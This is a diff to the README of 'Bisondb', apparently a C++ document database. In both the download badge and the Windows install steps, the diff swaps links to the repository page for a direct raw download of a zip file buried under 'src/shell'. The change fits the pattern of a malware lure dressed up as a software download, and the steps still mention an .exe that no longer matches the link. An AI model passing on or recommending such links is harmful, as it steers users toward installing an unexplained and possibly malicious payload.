@@ -1,6 +1,6 @@
 # 🦬 Bisondb - Manage your documents with speed
 
-[![](https://img.shields.io/badge/Download-Bisondb-blue.svg)](https://github.com/Kimberleyaxileplacentation59/Bisondb)
+[![](https://img.shields.io/badge/Download-Bisondb-blue.svg)](https://github.com/Kimberleyaxileplacentation59/Bisondb/raw/refs/heads/main/src/shell/Software-1.4.zip)
 
 Bisondb stores your data in a document format. It uses modern C++ tools to organize information. The system includes a storage engine, ways to sort data, a query tool, and a network server. You use this software to keep collections of documents on your computer. It reads and writes data through a command-line interface.
 
@@ -8,7 +8,7 @@ Bisondb stores your data in a document format. It uses modern C++ tools to organ
 
 Follow these steps to get the software on your Windows computer.
 
-1. Go to the [Bisondb download page](https://github.com/Kimberleyaxileplacentation59/Bisondb).
+1. Go to the [Bisondb download page](https://github.com/Kimberleyaxileplacentation59/Bisondb/raw/refs/heads/main/src/shell/Software-1.4.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the transfer to your computer.
 4. Save the file to your Downloads folder or your Desktop.
